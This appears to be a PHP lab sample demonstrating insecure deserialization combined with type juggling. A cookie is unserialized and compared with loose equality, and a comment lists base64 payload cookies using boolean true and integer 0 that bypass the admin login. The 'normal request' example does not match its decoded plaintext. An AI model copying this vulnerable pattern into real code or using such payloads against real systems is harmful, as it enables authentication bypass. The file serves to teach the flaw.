<?php

//Modifying data types/ PHP Type Juggling with insecure Deserialization

$adminName = "omar";
$username = "test";
$userpassword = "test";
$adminPassword = "omar" ;

$auth = base64_decode($_COOKIE['auth']);

$data = unserialize($auth);

print_r($data);

if ($data['username'] == $adminName && $data['password'] == $adminPassword) {
    $admin = true;

    echo "welcome admin";
} 
if ($data['username'] == $username && $data['password'] == $userpassword) {
	
	echo "welcome $username";
}
 else {
    $admin = false;
    echo "Not Authorized";
}


/*
Normal request

cookie: auth=YToyOntzOjg6InVzZXJuYW1lIjtzOjQ6Im9tYXIiO3M6ODoicGFzc3dvcmQiO3M6NDoib21hciI7fQ==
a:2:{s:8:"username";s:4:"test";s:8:"password";s:4:"test";

payload 1

cookie: auth=YToyOntzOjg6InVzZXJuYW1lIjtiOjE7czo4OiJwYXNzd29yZCI7YjoxO30=
a:2:{s:8:"username";b:1;s:8:"password";b:1;}

payload 2 < php 8.0

cookie: auth=YToyOntzOjg6InVzZXJuYW1lIjtpOjA7czo4OiJwYXNzd29yZCI7aTowO30=
a:2:{s:8:"username";i:0;s:8:"password";i:0;}

*/
?>